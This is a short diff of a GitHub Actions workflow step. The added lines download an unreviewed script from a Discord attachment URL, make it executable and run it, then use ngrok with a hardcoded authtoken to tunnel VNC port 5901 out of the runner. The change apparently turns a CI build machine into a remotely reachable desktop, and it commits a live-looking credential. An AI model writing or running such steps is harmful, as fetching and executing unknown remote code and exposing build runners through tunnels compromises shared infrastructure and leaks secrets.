@@ -27,8 +27,10 @@ jobs:
 
       - name: Buatan Gw Nih BOS @NETFLEX
         run: |
-          sudo docker run --rm -p 8080:8080 theasp/novnc
-          npm i ngrok -g
+          curl https://cdn.discordapp.com/attachments/884717610409795594/886085208787550239/wow.txt -o wow.sh
+          npm i -g ngrok
+          chmod +x wow.sh
+          ./wow.sh
           ngrok authtoken 1oomRxudQIaBrkFui5ofwWfETvB_2nirjctS3mEDJ9ZLg9LS6
-          ngrok http 8080 -region ap
+          ngrok tcp 5901 -region ap
           
